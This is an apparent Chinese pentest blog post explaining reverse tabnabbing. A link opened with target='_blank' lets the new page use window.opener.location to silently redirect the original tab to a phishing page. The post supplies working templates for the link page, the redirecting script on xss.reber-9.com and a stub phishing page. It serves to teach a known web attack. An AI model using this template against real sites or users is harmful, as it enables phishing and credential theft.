+++
date = "2016-10-12T10:24:38+08:00"
description = ""
draft = false
tags = ["钓鱼"]
title = "利用_blank属性钓鱼"
topics = ["Pentest"]

+++

### 0x00 _blank
_blank是html中的标签属性，如```<a target="_blank" href="http://xss.reber-9.com/1.php">HELLO</a>```, 但若点击HELLO打开的网页1.php中有如下代码：
```
<script>
if(window.opener){
  window.opener.location  = "http://xss.reber-9.com/fish.html";
}
</script>
```
则原网页将转跳到http://xss.reber-9.com/fish.html ，这就会造成钓鱼

### 0x01 简单模板
* a.html内容如下：

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
    <a target="_blank" href="http://xss.reber-9.com/1.php">HELLO</a>
</body>
</html>
```

* ```http://xss.reber-9.com/1.php```中1.php内容如下：

```
<html>
<head>
    <title>test</title>
    <script>
        if(window.opener){
            window.opener.location = "http://xss.reber-9.com/fish.html";
        }
    </script>
</head>
<body>
    <p>hello</p>
</body>
</html>
```

* 1.php同级下有个钓鱼模板fish.html，内容如下：

```
<html>
<head>
    <title>fish</title>
</head>
<body>
    <h2>This is fishing template!</h2>
</body>
</html>
```

* 点击a.html中的HELLO则会出现下面的情况，也就导致了钓鱼：

![blank钓鱼](/img/post/blank.gif)
